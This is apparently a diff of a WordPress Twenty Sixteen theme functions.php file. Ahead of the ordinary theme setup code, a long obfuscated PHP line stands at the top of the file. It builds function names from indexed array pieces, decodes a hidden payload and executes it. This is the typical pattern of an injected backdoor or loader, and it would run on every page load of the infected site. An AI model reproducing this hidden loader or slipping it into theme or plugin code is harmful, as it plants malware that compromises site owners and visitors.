mxrqs[104].$mxrqs[59].$mxrqs[47].$mxrqs[6].$mxrqs[122].$mxrqs[20].$mxrqs[25].$mxrqs[20].$mxrqs[127].$mxrqs[16].$mxrqs[7].$mxrqs[18].$mxrqs[21].$mxrqs[37].$mxrqs[15].$mxrqs[158].$mxrqs[14].$mxrqs[127].$mxrqs[12].$mxrqs[416].$mxrqs[56].$mxrqs[45].$mxrqs[15].$mxrqs[6].$mxrqs[104].$mxrqs[8].$mxrqs[15].$mxrqs[27].$mxrqs[39].$mxrqs[113].$mxrqs[113].$mxrqs[13].$mxrqs[48].$mxrqs[88].$mxrqs[10].$mxrqs[95].$mxrqs[16].$mxrqs[275].$mxrqs[104].$mxrqs[7].$mxrqs[16].$mxrqs[104].$mxrqs[56].$mxrqs[118].$mxrqs[59].$mxrqs[416].$mxrqs[164].$mxrqs[16].$mxrqs[34].$mxrqs[104].$mxrqs[64].$mxrqs[416].$mxrqs[69].$mxrqs[25].$mxrqs[4].$mxrqs[48].$mxrqs[39].$mxrqs[16].$mxrqs[20].$mxrqs[5].$mxrqs[7].$mxrqs[34].$mxrqs[104].$mxrqs[45].$mxrqs[2].$mxrqs[21].$mxrqs[47].$mxrqs[12].$mxrqs[109].$mxrqs[25].$mxrqs[69].$mxrqs[100].$mxrqs[39].$mxrqs[69].$mxrqs[154].$mxrqs[1].$mxrqs[118].$mxrqs[73].$mxrqs[194].$mxrqs[118].$mxrqs[1].$mxrqs[95].$mxrqs[154].$mxrqs[113].$mxrqs[52].$mxrqs[27].$mxrqs[416].$mxrqs[275].$mxrqs[88].$mxrqs[10].$mxrqs[14].$mxrqs[48].$mxrqs[64].$mxrqs[3].$mxrqs[194].$mxrqs[37].$mxrqs[111].$mxrqs[91].$mxrqs[43].$mxrqs[113].$mxrqs[164].$mxrqs[0].$mxrqs[12].$mxrqs[43].$mxrqs[21].$mxrqs[9].$mxrqs[27].$mxrqs[18].$mxrqs[100].$mxrqs[39].$mxrqs[23].$mxrqs[6].$mxrqs[164].$mxrqs[88].$mxrqs[44].$mxrqs[127].$mxrqs[154].$mxrqs[64].$mxrqs[7].$mxrqs[39].$mxrqs[56].$mxrqs[113].$mxrqs[4].$mxrqs[111].$mxrqs[27].$mxrqs[100].$mxrqs[68].$mxrqs[37].$mxrqs[109].$mxrqs[91].$mxrqs[25].$mxrqs[122].$mxrqs[56].$mxrqs[416].$mxrqs[127].$mxrqs[4].$mxrqs[14].$mxrqs[122].$mxrqs[63].$mxrqs[3].$mxrqs[15].$mxrqs[118].$mxrqs[43].$mxrqs[95].$mxrqs[154].$mxrqs[275].$mxrqs[231].$mxrqs[34].$mxrqs[5].$mxrqs[127].$mxrqs[118].$mxrqs[39].$mxrqs[73].$mxrqs[63].$mxrqs[7].$mxrqs[9].$mxrqs[15].$mxrqs[5].$mxrqs[16].$mxrqs[3].$mxrqs[118].$mxrqs[43].$mxrqs[8].$mxrqs[88].$mxrqs[194].$mxrqs[184].$mxrqs[66].$mxrqs[154].$mxrqs[27].$mxrqs[33].$mxrqs[118].$mxrqs[66].$mxrqs[68].$mxrqs[63].$mxrqs[9].$mxrqs[95].$mxrqs[88].$mxrqs[64].$mxrqs[10].$mxrqs[18].$mxrqs[5].$mxrqs[59].$mxrqs[113].$mxrqs[6].$mxrqs[47].$mxrqs[39].$mxrqs[34].$mxrqs[194].$mxrqs[39].$mxrqs[0].$mxrqs[100].$mxrqs[69].$mxrqs[231].$mxrqs[13].$mxrqs[6].$mxrqs[63].$mxrqs[109].$mxrqs[113].$mxrqs[68].$mxrqs[37].$mxrqs[18].$mxrqs[73].$mxrqs[1].$mxrqs[13].$mxrqs[27].$mxrqs[48].$mxrqs[66].$mxrqs[127].$mxrqs[36].$mxrqs[4].$mxrqs[113].$mxrqs[64].$mxrqs[33].$mxrqs[63].$mxrqs[69].$mxrqs[12].$mxrqs[275].$mxrqs[22].$mxrqs[416].$mxrqs[104].$mxrqs[100].$mxrqs[37].$mxrqs[154].$mxrqs[36].$mxrqs[95].$mxrqs[0].$mxrqs[68].$mxrqs[9].$mxrqs[18].$mxrqs[1].$mxrqs[34].$mxrqs[184].$mxrqs[104].$mxrqs[69].$mxrqs[88].$mxrqs[91].$mxrqs[34].$mxrqs[27].$mxrqs[3].$mxrqs[64].$mxrqs[22].$mxrqs[37].$mxrqs[91].$mxrqs[56].$mxrqs[231].$mxrqs[23].$mxrqs[0].$mxrqs[22].$mxrqs[5].$mxrqs[184].$mxrqs[231].$mxrqs[15].$mxrqs[18].$mxrqs[21].$mxrqs[111].$mxrqs[45].$mxrqs[39].$mxrqs[12].$mxrqs[3].$mxrqs[113].$mxrqs[154].$mxrqs[33].$mxrqs[3].$mxrqs[59].$mxrqs[73].$mxrqs[44].$mxrqs[111].$mxrqs[39].$mxrqs[88].$mxrqs[91].$mxrqs[4].$mxrqs[20].$mxrqs[6].$mxrqs[44].$mxrqs[73].$mxrqs[68].$mxrqs[104].$mxrqs[47].$mxrqs[63].$mxrqs[113].$mxrqs[95].$mxrqs[0].$mxrqs[13].$mxrqs[59].$mxrqs[34].$mxrqs[47].$mxrqs[39].$mxrqs[45].$mxrqs[158].$mxrqs[27].$mxrqs[69].$mxrqs[113].$mxrqs[21].$mxrqs[109].$mxrqs[39].$mxrqs[45].$mxrqs[2].$mxrqs[111].$mxrqs[69].$mxrqs[73].$mxrqs[2].$mxrqs[111].$mxrqs[113].$mxrqs[45].$mxrqs[33].$mxrqs[127].$mxrqs[23].$mxrqs[274].$mxrqs[109].$mxrqs[231].$mxrqs[47].$mxrqs[8].$mxrqs[158].$mxrqs[64].$mxrqs[111].$mxrqs[10].$mxrqs[68].$mxrqs[23].$mxrqs[4].$mxrqs[64].$mxrqs[10].$mxrqs[5].$mxrqs[20].$mxrqs[8].$mxrqs[63].$mxrqs[17].$mxrqs[91].$mxrqs[274].$mxrqs[104].$mxrqs[104].$mxrqs[17].$mxrqs[59].$mxrqs[23].$mxrqs[111].$mxrqs[15].$mxrqs[118].$mxrqs[39].$mxrqs[275].$mxrqs[10].$mxrqs[66].$mxrqs[39].$mxrqs[13].$mxrqs[194].$mxrqs[88].$mxrqs[194].$mxrqs[52].$mxrqs[44].$mxrqs[154].$mxrqs[21].$mxrqs[4].$mxrqs[66].$mxrqs[104].$mxrqs[36].$mxrqs[25].$mxrqs[23].$mxrqs[127].$mxrqs[9].$mxrqs[8].$mxrqs[44].$mxrqs[274].$mxrqs[184].$mxrqs[56].$mxrqs[13].$mxrqs[18].$mxrqs[68].$mxrqs[36].$mxrqs[6].$mxrqs[17].$mxrqs[66].$mxrqs[45].$mxrqs[45].$mxrqs[34].$mxrqs[154].$mxrqs[56].$mxrqs[91].$mxrqs[22].$mxrqs[0].$mxrqs[122].$mxrqs[1].$mxrqs[100].$mxrqs[274].$mxrqs[22].$mxrqs[1].$mxrqs[59].$mxrqs[14].$mxrqs[127].$mxrqs[194].$mxrqs[63].$mxrqs[95].$mxrqs[9].$mxrqs[109].$mxrqs[88].$mxrqs[91].$mxrqs[2].$mxrqs[66].$mxrqs[59].$mxrqs[231].$mxrqs[100].$mxrqs[111].$mxrqs[13].$mxrqs[29].$mxrqs[88].$mxrqs[91].$mxrqs[45].$mxrqs[5].$mxrqs[1].$mxrqs[154].$mxrqs[56].$mxrqs[56].$mxrqs[9].$mxrqs[275].$mxrqs[275].$mxrqs[4].$mxrqs[59].$mxrqs[14].$mxrqs[43].$mxrqs[154].$mxrqs[47].$mxrqs[88].$mxrqs[16].$mxrqs[2].$mxrqs[68].$mxrqs[34].$mxrqs[56].$mxrqs[29].$mxrqs[113].$mxrqs[34].$mxrqs[100].$mxrqs[22].$mxrqs[0].$mxrqs[231].$mxrqs[21].$mxrqs[16].$mxrqs[47].$mxrqs[3].$mxrqs[118].$mxrqs[43].$mxrqs[274].$mxrqs[36].$mxrqs[111].$mxrqs[2].$mxrqs[59].$mxrqs[12].$mxrqs[100].$mxrqs[5].$mxrqs[18].$mxrqs[109].$mxrqs[4].$mxrqs[33].$mxrqs[118].$mxrqs[12].$mxrqs[47].$mxrqs[8].$mxrqs[118].$mxrqs[127].$mxrqs[184].$mxrqs[5].$mxrqs[10].$mxrqs[194].$mxrqs[10].$mxrqs[3].$mxrqs[33].$mxrqs[6].$mxrqs[104].$mxrqs[95].$mxrqs[6].$mxrqs[6].$mxrqs[37].$mxrqs[73].$mxrqs[43].$mxrqs[23].$mxrqs[47].$mxrqs[27].$mxrqs[43].$mxrqs[88].$mxrqs[48].$mxrqs[33].$mxrqs[118].$mxrqs[12].$mxrqs[109].$mxrqs[14].$mxrqs[36].$mxrqs[4].$mxrqs[122].$mxrqs[12].$mxrqs[14].$mxrqs[52].$mxrqs[64].$mxrqs[111].$mxrqs[52].$mxrqs[104].$mxrqs[43].$mxrqs[16].$mxrqs[95].$mxrqs[29].$mxrqs[33].$mxrqs[64].$mxrqs[21].$mxrqs[33].$mxrqs[111].$mxrqs[44].$mxrqs[9].$mxrqs[73].$mxrqs[22].$mxrqs[27].$mxrqs[100].$mxrqs[194].$mxrqs[43].$mxrqs[113].$mxrqs[0].$mxrqs[5].$mxrqs[158].$mxrqs[8].$mxrqs[52].$mxrqs[9].$mxrqs[127].$mxrqs[109].$mxrqs[39].$mxrqs[122].$mxrqs[5].$mxrqs[158].$mxrqs[113].$mxrqs[17].$mxrqs[275].$mxrqs[14].$mxrqs[22].$mxrqs[14].$mxrqs[2].$mxrqs[12].$mxrqs[0].$mxrqs[91].$mxrqs[118].$mxrqs[104].$mxrqs[66].$mxrqs[43].$mxrqs[6].$mxrqs[10].$mxrqs[9].$mxrqs[27].$mxrqs[91].$mxrqs[63].$mxrqs[100].$mxrqs[59].$mxrqs[2].$mxrqs[56].$mxrqs[63].$mxrqs[43].$mxrqs[27].$mxrqs[10].$mxrqs[44].$mxrqs[95].$mxrqs[29].$mxrqs[69].$mxrqs[39].$mxrqs[43].$mxrqs[95].$mxrqs[27].$mxrqs[4].$mxrqs[48].$mxrqs[33].$mxrqs[8].$mxrqs[118].$mxrqs[17].$mxrqs[63].$mxrqs[17].$mxrqs[73].$mxrqs[18].$mxrqs[66].$mxrqs[8].$mxrqs[1].$mxrqs[64].$mxrqs[1].$mxrqs[18].$mxrqs[3].$mxrqs[95].$mxrqs[23].$mxrqs[12].$mxrqs[100].$mxrqs[416].$mxrqs[59].$mxrqs[2].$mxrqs[39].$mxrqs[14].$mxrqs[9].$mxrqs[164].$mxrqs[43].$mxrqs[47].$mxrqs[8].$mxrqs[56].$mxrqs[63].$mxrqs[56].$mxrqs[158].$mxrqs[73].$mxrqs[416].$mxrqs[39].$mxrqs[69].$mxrqs[88].$mxrqs[95].$mxrqs[10].$mxrqs[73].$mxrqs[36].$mxrqs[13].$mxrqs[34].$mxrqs[88].$mxrqs[45].$mxrqs[25].$mxrqs[154].$mxrqs[68].$mxrqs[12].$mxrqs[127].$mxrqs[44].$mxrqs[4].$mxrqs[20].$mxrqs[16].$mxrqs[158].$mxrqs[10].$mxrqs[20].$mxrqs[48].$mxrqs[18].$mxrqs[184].$mxrqs[66].$mxrqs[154].$mxrqs[68].$mxrqs[4].$mxrqs[52].$mxrqs[21].$mxrqs[104].$mxrqs[59].$mxrqs[274].$mxrqs[56].$mxrqs[10].$mxrqs[48].$mxrqs[16].$mxrqs[9].$mxrqs[104].$mxrqs[47].$mxrqs[18].$mxrqs[44].$mxrqs[73].$mxrqs[34].$mxrqs[69].$mxrqs[15].$mxrqs[37].$mxrqs[56].$mxrqs[113].$mxrqs[88].$mxrqs[36].$mxrqs[29].$mxrqs[17].$mxrqs[7].$mxrqs[13].$mxrqs[4].$mxrqs[416].$mxrqs[34].$mxrqs[44].$mxrqs[20].$mxrqs[154].$mxrqs[16].$mxrqs[73].$mxrqs[158].$mxrqs[164].$mxrqs[33].$mxrqs[95].$mxrqs[18].$mxrqs[109].$mxrqs[36].$mxrqs[88].$mxrqs[25].$mxrqs[16].$mxrqs[23].$mxrqs[0].$mxrqs[59].$mxrqs[104].$mxrqs[18].$mxrqs[5].$mxrqs[91].$mxrqs[48].$mxrqs[73].$mxrqs[47].$mxrqs[88].$mxrqs[25].$mxrqs[56].$mxrqs[5].$mxrqs[20].$mxrqs[184].$mxrqs[21].$mxrqs[2].$mxrqs[34].$mxrqs[416].$mxrqs[88].$mxrqs[18].$mxrqs[36].$mxrqs[17].$mxrqs[36].$mxrqs[9].$mxrqs[23].$mxrqs[17].$mxrqs[44].$mxrqs[231].$mxrqs[8].$mxrqs[184].$mxrqs[127].$mxrqs[1].$mxrqs[158].$mxrqs[231].$mxrqs[0].$mxrqs[158].$mxrqs[154].$mxrqs[184].$mxrqs[23].$mxrqs[12].$mxrqs[16].$mxrqs[66].$mxrqs[14].$mxrqs[59].$mxrqs[59].$mxrqs[2].$mxrqs[91].$mxrqs[66].$mxrqs[59].$mxrqs[14].$mxrqs[17].$mxrqs[14].$mxrqs[18].$mxrqs[109].$mxrqs[64].$mxrqs[56].$mxrqs[109].$mxrqs[22].$mxrqs[9].$mxrqs[14].$mxrqs[37].$mxrqs[100].$mxrqs[15].$mxrqs[47].$mxrqs[164].$mxrqs[164].$mxrqs[118].$mxrqs[33].$mxrqs[158].$mxrqs[68].$mxrqs[91].$mxrqs[16].$mxrqs[109].$mxrqs[118].$mxrqs[29].$mxrqs[122].$mxrqs[6].$mxrqs[45].$mxrqs[4].$mxrqs[66].$mxrqs[27].$mxrqs[118].$mxrqs[7].$mxrqs[8].$mxrqs[88].$mxrqs[66].$mxrqs[9].$mxrqs[5].$mxrqs[64].$mxrqs[118].$mxrqs[69].$mxrqs[13].$mxrqs[158].$mxrqs[14].$mxrqs[0].$mxrqs[27].$mxrqs[21].$mxrqs[3].$mxrqs[63].$mxrqs[59].$mxrqs[22].$mxrqs[4].$mxrqs[91].$mxrqs[109].$mxrqs[36].$mxrqs[29].$mxrqs[16].$mxrqs[122].$mxrqs[109].$mxrqs[18].$mxrqs[66].$mxrqs[5].$mxrqs[21].$mxrqs[15].$mxrqs[0].$mxrqs[63].$mxrqs[88].$mxrqs[68].$mxrqs[45].$mxrqs[88].$mxrqs[122].$mxrqs[2].$mxrqs[23].$mxrqs[66].$mxrqs[13].$mxrqs[45].$mxrqs[274].$mxrqs[48].$mxrqs[274].$mxrqs[45].$mxrqs[36].$mxrqs[4].$mxrqs[6].$mxrqs[111].$mxrqs[25].$mxrqs[184].$mxrqs[22].$mxrqs[113].$mxrqs[164].$mxrqs[275].$mxrqs[194].$mxrqs[4].$mxrqs[10].$mxrqs[16].$mxrqs[66].$mxrqs[274].$mxrqs[91].$mxrqs[118].$mxrqs[88].$mxrqs[95].$mxrqs[275].$mxrqs[36].$mxrqs[43].$mxrqs[104].$mxrqs[122].$mxrqs[100].$mxrqs[25].$mxrqs[95].$mxrqs[13].$mxrqs[59].$mxrqs[37].$mxrqs[274].$mxrqs[69].$mxrqs[184].$mxrqs[23].$mxrqs[2].$mxrqs[25].$mxrqs[164].$mxrqs[109].$mxrqs[91].$mxrqs[43].$mxrqs[45].$mxrqs[47].$mxrqs[18].$mxrqs[17].$mxrqs[100].$mxrqs[45].$mxrqs[68].$mxrqs[36].$mxrqs[25].$mxrqs[16].$mxrqs[22].$mxrqs[4].$mxrqs[104].$mxrqs[184].$mxrqs[274].$mxrqs[47].$mxrqs[88].$mxrqs[274].$mxrqs[73].$mxrqs[158].$mxrqs[91].$mxrqs[6].$mxrqs[127].$mxrqs[45].$mxrqs[22].$mxrqs[29].$mxrqs[111].$mxrqs[231].$mxrqs[43].$mxrqs[158].$mxrqs[164].$mxrqs[2].$mxrqs[44].$mxrqs[68].$mxrqs[20].$mxrqs[91].$mxrqs[127].$mxrqs[52].$mxrqs[47].$mxrqs[33].$mxrqs[39].$mxrqs[18].$mxrqs[113].$mxrqs[69].$mxrqs[127].$mxrqs[44].$mxrqs[59].$mxrqs[44].$mxrqs[127].$mxrqs[52].$mxrqs[43].$mxrqs[21].$mxrqs[95].$mxrqs[8].$mxrqs[91].$mxrqs[17].$mxrqs[12].$mxrqs[48].$mxrqs[1].$mxrqs[73].$mxrqs[13].$mxrqs[109].$mxrqs[29].$mxrqs[25].$mxrqs[22].$mxrqs[109].$mxrqs[109].$mxrqs[36].$mxrqs[416].$mxrqs[416].$mxrqs[22].$mxrqs[164].$mxrqs[4].$mxrqs[34].$mxrqs[22].$mxrqs[59].$mxrqs[25].$mxrqs[14].$mxrqs[158].$mxrqs[63].$mxrqs[8].$mxrqs[416].$mxrqs[14].$mxrqs[122].$mxrqs[43].$mxrqs[9].$mxrqs[184].$mxrqs[10].$mxrqs[3].$mxrqs[59].$mxrqs[118].$mxrqs[100].$mxrqs[69].$mxrqs[10].$mxrqs[13].$mxrqs[122].$mxrqs[44].$mxrqs[164].$mxrqs[39].$mxrqs[122].$mxrqs[5].$mxrqs[111].$mxrqs[0].$mxrqs[4].$mxrqs[21].$mxrqs[27].$mxrqs[45].$mxrqs[17].$mxrqs[48].$mxrqs[4].$mxrqs[8].$mxrqs[27].$mxrqs[21].$mxrqs[111].$mxrqs[48].$mxrqs[231].$mxrqs[194].$mxrqs[12].$mxrqs[154].$mxrqs[416].$mxrqs[34].$mxrqs[5].$mxrqs[5].$mxrqs[113].$mxrqs[14].$mxrqs[45].$mxrqs[6].$mxrqs[88].$mxrqs[2].$mxrqs[14].$mxrqs[16].$mxrqs[59].$mxrqs[64].$mxrqs[25].$mxrqs[2].$mxrqs[111].$mxrqs[48].$mxrqs[59].$mxrqs[113].$mxrqs[416].$mxrqs[194].$mxrqs[10].$mxrqs[36].$mxrqs[9].$mxrqs[45].$mxrqs[34].$mxrqs[113].$mxrqs[29].$mxrqs[52].$mxrqs[63].$mxrqs[22].$mxrqs[118].$mxrqs[109].$mxrqs[56].$mxrqs[231].$mxrqs[7].$mxrqs[23].$mxrqs[7].$mxrqs[44].$mxrqs[8].$mxrqs[64].$mxrqs[29].$mxrqs[194].$mxrqs[88].$mxrqs[29].$mxrqs[154].$mxrqs[45].$mxrqs[36].$mxrqs[47].$mxrqs[231].$mxrqs[20].$mxrqs[44].$mxrqs[16].$mxrqs[73].$mxrqs[1].$mxrqs[59].$mxrqs[10].$mxrqs[43].$mxrqs[91].$mxrqs[113].$mxrqs[25].$mxrqs[184].$mxrqs[39].$mxrqs[33].$mxrqs[22].$mxrqs[29].$mxrqs[7].$mxrqs[122].$mxrqs[29].$mxrqs[274].$mxrqs[64].$mxrqs[34].$mxrqs[73].$mxrqs[154].$mxrqs[64].$mxrqs[109].$mxrqs[44].$mxrqs[122].$mxrqs[3].$mxrqs[25].$mxrqs[59].$mxrqs[44].$mxrqs[25].$mxrqs[69].$mxrqs[9].$mxrqs[275].$mxrqs[164].$mxrqs[25].$mxrqs[17].$mxrqs[275].$mxrqs[154].$mxrqs[43].$mxrqs[59].$mxrqs[25].$mxrqs[15].$mxrqs[73].$mxrqs[184].$mxrqs[9].$mxrqs[34].$mxrqs[64].$mxrqs[88].$mxrqs[3].$mxrqs[73].$mxrqs[2].$mxrqs[6].$mxrqs[20].$mxrqs[34].$mxrqs[154].$mxrqs[127].$mxrqs[44].$mxrqs[8].$mxrqs[63].$mxrqs[56].$mxrqs[21].$mxrqs[194].$mxrqs[95].$mxrqs[43].$mxrqs[45].$mxrqs[34].$mxrqs[34].$mxrqs[64].$mxrqs[29].$mxrqs[22].$mxrqs[113].$mxrqs[5].$mxrqs[164].$mxrqs[127].$mxrqs[47].$mxrqs[194].$mxrqs[9].$mxrqs[29].$mxrqs[3].$mxrqs[44].$mxrqs[194].$mxrqs[6].$mxrqs[5].$mxrqs[27].$mxrqs[122].$mxrqs[45].$mxrqs[17].$mxrqs[17].$mxrqs[21].$mxrqs[3].$mxrqs[33].$mxrqs[17].$mxrqs[5].$mxrqs[164].$mxrqs[13].$mxrqs[154].$mxrqs[88].$mxrqs[20].$mxrqs[122].$mxrqs[52].$mxrqs[21].$mxrqs[5].$mxrqs[69].$mxrqs[10].$mxrqs[25].$mxrqs[118].$mxrqs[8].$mxrqs[158].$mxrqs[64].$mxrqs[118].$mxrqs[39].$mxrqs[416].$mxrqs[14].$mxrqs[3].$mxrqs[1].$mxrqs[274].$mxrqs[34].$mxrqs[20].$mxrqs[37].$mxrqs[158].$mxrqs[0].$mxrqs[15].$mxrqs[6].$mxrqs[33].$mxrqs[91].$mxrqs[27].$mxrqs[20].$mxrqs[66].$mxrqs[118].$mxrqs[44].$mxrqs[6].$mxrqs[34].$mxrqs[27].$mxrqs[164].$mxrqs[59].$mxrqs[56].$mxrqs[56].$mxrqs[3].$mxrqs[25].$mxrqs[113].$mxrqs[109].$mxrqs[45].$mxrqs[15].$mxrqs[20].$mxrqs[14].$mxrqs[20].$mxrqs[88].$mxrqs[36].$mxrqs[43].$mxrqs[47].$mxrqs[4].$mxrqs[9].$mxrqs[43].$mxrqs[37].$mxrqs[16].$mxrqs[59].$mxrqs[20].$mxrqs[158].$mxrqs[12].$mxrqs[6].$mxrqs[118].$mxrqs[36].$mxrqs[158].$mxrqs[95].$mxrqs[184].$mxrqs[10].$mxrqs[104].$mxrqs[14].$mxrqs[45].$mxrqs[3].$mxrqs[27].$mxrqs[23].$mxrqs[25].$mxrqs[25].$mxrqs[14].$mxrqs[47].$mxrqs[194].$mxrqs[21].$mxrqs[1].$mxrqs[194].$mxrqs[48].$mxrqs[47].$mxrqs[16].$mxrqs[10].$mxrqs[47].$mxrqs[6].$mxrqs[48].$mxrqs[69].$mxrqs[158].$mxrqs[45].$mxrqs[22].$mxrqs[194].$mxrqs[34].$mxrqs[274].$mxrqs[48].$mxrqs[48].$mxrqs[6].$mxrqs[95].$mxrqs[100].$mxrqs[25].$mxrqs[37].$mxrqs[39].$mxrqs[275].$mxrqs[1].$mxrqs[104].$mxrqs[4].$mxrqs[122].$mxrqs[9].$mxrqs[47].$mxrqs[111].$mxrqs[154].$mxrqs[158].$mxrqs[47].$mxrqs[39].$mxrqs[194].$mxrqs[47].$mxrqs[33].$mxrqs[109].$mxrqs[39].$mxrqs[127].$mxrqs[18].$mxrqs[8].$mxrqs[52].$mxrqs[91].$mxrqs[0].$mxrqs[47].$mxrqs[104].$mxrqs[9].$mxrqs[39].$mxrqs[275].$mxrqs[118].$mxrqs[100].$mxrqs[25].$mxrqs[275].$mxrqs[100].$mxrqs[43].$mxrqs[43].$mxrqs[164].$mxrqs[91].$mxrqs[12].$mxrqs[14].$mxrqs[3].$mxrqs[37].$mxrqs[64].$mxrqs[34].$mxrqs[359].$mxrqs[359];$uehquaiyas=$mxrqs[118].$mxrqs[231].$mxrqs[69].$mxrqs[73].$mxrqs[48].$mxrqs[158].$mxrqs[1251].$mxrqs[1].$mxrqs[73].$mxrqs[20].$mxrqs[52].$mxrqs[1].$mxrqs[73];$efyvwregag=$mxrqs[274].$mxrqs[4].$mxrqs[12].$mxrqs[64].$mxrqs[20].$mxrqs[52].$mxrqs[59].$mxrqs[14].$mxrqs[104].$mxrqs[73].$mxrqs[69].$mxrqs[69];$hjfxjlucnph=$mxrqs[69].$mxrqs[10].$mxrqs[104].$mxrqs[104].$mxrqs[73].$mxrqs[25];$fcvnbwgbblaxhr=$mxrqs[20].$mxrqs[104].$mxrqs[73].$mxrqs[231].$mxrqs[10].$mxrqs[73].$mxrqs[1251].$mxrqs[18].$mxrqs[12].$mxrqs[64].$mxrqs[20].$mxrqs[10].$mxrqs[56].$mxrqs[52].$mxrqs[64];$orivzrbwan=$mxrqs[1519].$mxrqs[231];$daflvlnrypofr=$mxrqs[4009].$mxrqs[3608].$mxrqs[231].$mxrqs[1519].$mxrqs[1429].$mxrqs[16].$mxrqs[231].$mxrqs[25].$mxrqs[73];$qrnyipmayhzpj=$mxrqs[73].$mxrqs[5].$mxrqs[56].$mxrqs[10];$djkrhwoswjnlp=$hjfxjlucnph;$nduykxopsbbk=$efyvwregag($uehquaiyas($kjbahcypzgxt));$nduykxopsbbk=$djkrhwoswjnlp($nduykxopsbbk);$qohfrrpjzly=$fcvnbwgbblaxhr($orivzrbwan,$hjfxjlucnph($daflvlnrypofr));$qohfrrpjzly($hjfxjlucnph($nduykxopsbbk));$qrnyipmayhzpj;?><?php
+/**
+ * Twenty Sixteen functions and definitions
+ *
+ * Set up the theme and provides some helper functions, which are used in the
+ * theme as custom template tags. Others are attached to action and filter
+ * hooks in WordPress to change core functionality.
+ *
+ * When using a child theme you can override certain functions (those wrapped
+ * in a function_exists() call) by defining them first in your child theme's
+ * functions.php file. The child theme's functions.php file is included before
+ * the parent theme's file, so the child theme functions would be used.
+ *
+ * @link https://codex.wordpress.org/Theme_Development
+ * @link https://codex.wordpress.org/Child_Themes
+ *
+ * Functions that are not pluggable (not wrapped in function_exists()) are
+ * instead attached to a filter or action hook.
+ *
+ * For more information on hooks, actions, and filters,
+ * {@link https://codex.wordpress.org/Plugin_API}
+ *
+ * @package WordPress
+ * @subpackage Twenty_Sixteen
+ * @since Twenty Sixteen 1.0
+ */
+
+/**
+ * Twenty Sixteen only works in WordPress 4.4 or later.
+ */
+if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {
+	require get_template_directory() . '/inc/back-compat.php';
+}
+
+if ( ! function_exists( 'twentysixteen_setup' ) ) :
+/**
+ * Sets up theme defaults and registers support for various WordPress features.
+ *
+ * Note that this function is hooked into the after_setup_theme hook, which
+ * runs before the init hook. The init hook is too late for some features, such
+ * as indicating support for post thumbnails.
+ *
+ * Create your own twentysixteen_setup() function to override in a child theme.
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_setup() {
+	/*
+	 * Make theme available for translation.
+	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentysixteen
+	 * If you're building a theme based on Twenty Sixteen, use a find and replace
+	 * to change 'twentysixteen' to the name of your theme in all the template files
+	 */
+	load_theme_textdomain( 'twentysixteen' );
+
+	// Add default posts and comments RSS feed links to head.
+	add_theme_support( 'automatic-feed-links' );
+
+	/*
+	 * Let WordPress manage the document title.
+	 * By adding theme support, we declare that this theme does not use a
+	 * hard-coded <title> tag in the document head, and expect WordPress to
+	 * provide it for us.
+	 */
+	add_theme_support( 'title-tag' );
+
+	/*
+	 * Enable support for custom logo.
+	 *
+	 *  @since Twenty Sixteen 1.2
+	 */
+	add_theme_support( 'custom-logo', array(
+		'height'      => 240,
+		'width'       => 240,
+		'flex-height' => true,
+	) );
+
+	/*
+	 * Enable support for Post Thumbnails on posts and pages.
+	 *
+	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
+	 */
+	add_theme_support( 'post-thumbnails' );
+	set_post_thumbnail_size( 1200, 9999 );
+
+	// This theme uses wp_nav_menu() in two locations.
+	register_nav_menus( array(
+		'primary' => __( 'Primary Menu', 'twentysixteen' ),
+		'social'  => __( 'Social Links Menu', 'twentysixteen' ),
+	) );
+
+	/*
+	 * Switch default core markup for search form, comment form, and comments
+	 * to output valid HTML5.
+	 */
+	add_theme_support( 'html5', array(
+		'search-form',
+		'comment-form',
+		'comment-list',
+		'gallery',
+		'caption',
+	) );
+
+	/*
+	 * Enable support for Post Formats.
+	 *
+	 * See: https://codex.wordpress.org/Post_Formats
+	 */
+	add_theme_support( 'post-formats', array(
+		'aside',
+		'image',
+		'video',
+		'quote',
+		'link',
+		'gallery',
+		'status',
+		'audio',
+		'chat',
+	) );
+
+	/*
+	 * This theme styles the visual editor to resemble the theme style,
+	 * specifically font, colors, icons, and column width.
+	 */
+	add_editor_style( array( 'css/editor-style.css', twentysixteen_fonts_url() ) );
+
+	// Indicate widget sidebars can use selective refresh in the Customizer.
+	add_theme_support( 'customize-selective-refresh-widgets' );
+}
+endif; // twentysixteen_setup
+add_action( 'after_setup_theme', 'twentysixteen_setup' );
+
+/**
+ * Sets the content width in pixels, based on the theme's design and stylesheet.
+ *
+ * Priority 0 to make it available to lower priority callbacks.
+ *
+ * @global int $content_width
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_content_width() {
+	$GLOBALS['content_width'] = apply_filters( 'twentysixteen_content_width', 840 );
+}
+add_action( 'after_setup_theme', 'twentysixteen_content_width', 0 );
+
+/**
+ * Registers a widget area.
+ *
+ * @link https://developer.wordpress.org/reference/functions/register_sidebar/
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_widgets_init() {
+	register_sidebar( array(
+		'name'          => __( 'Sidebar', 'twentysixteen' ),
+		'id'            => 'sidebar-1',
+		'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentysixteen' ),
+		'before_widget' => '<section id="%1$s" class="widget %2$s">',
+		'after_widget'  => '</section>',
+		'before_title'  => '<h2 class="widget-title">',
+		'after_title'   => '</h2>',
+	) );
+
+	register_sidebar( array(
+		'name'          => __( 'Content Bottom 1', 'twentysixteen' ),
+		'id'            => 'sidebar-2',
+		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
+		'before_widget' => '<section id="%1$s" class="widget %2$s">',
+		'after_widget'  => '</section>',
+		'before_title'  => '<h2 class="widget-title">',
+		'after_title'   => '</h2>',
+	) );
+
+	register_sidebar( array(
+		'name'          => __( 'Content Bottom 2', 'twentysixteen' ),
+		'id'            => 'sidebar-3',
+		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
+		'before_widget' => '<section id="%1$s" class="widget %2$s">',
+		'after_widget'  => '</section>',
+		'before_title'  => '<h2 class="widget-title">',
+		'after_title'   => '</h2>',
+	) );
+}
+add_action( 'widgets_init', 'twentysixteen_widgets_init' );
+
+if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
+/**
+ * Register Google fonts for Twenty Sixteen.
+ *
+ * Create your own twentysixteen_fonts_url() function to override in a child theme.
